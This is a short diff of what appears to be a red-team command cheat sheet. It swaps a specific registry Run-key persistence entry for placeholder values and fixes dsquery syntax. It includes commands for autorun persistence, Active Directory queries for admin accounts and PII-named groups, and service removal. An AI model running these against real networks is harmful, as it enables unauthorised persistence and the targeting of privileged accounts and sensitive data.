@@ -11,7 +11,7 @@ You can click the Preview link to take a look at your changes.
 
 reg query "HKCU\Software\Microsoft\Windows\Currentversion\Run"
 
-shell reg add "HKCU\Software\Microsoft\Windows\Currentversion\Run" /V "Backup" /t REG_SZ /F /D "C:\Users\alan.grant\AppData\Local\installer.exe"
+shell reg add "HKCU\Software\Microsoft\Windows\Currentversion\Run" /V "Name" /t REG_SZ /F /D "C:\Path\to\file"
 
 
 shell dsquery * -filter "(&(objectclass= user)(Admincount=1))" -attr samaccountname name AdminCount limit 0
@@ -24,9 +24,9 @@ shell dsquery * -filter "(name= *PII*)" -attr samaccountname name limit 0
 
 shell dsquery * -filter "(name= *PII*)" -attr * limit 5
 
-shell dsquery * -filter "(name= SupervisorsManagersLeadership)" -attr * limit 5
+shell dsquery * -filter "(name= SupervisorsManagersLeadership)" -attr * -limit 5
 
-shell dsquery * -filter "(name= *workman*)" -attr * limit 5
+shell dsquery * -filter "(name= *workman*)" -attr * -limit 5
 
 sc query NewServ
 sc delete NewServ
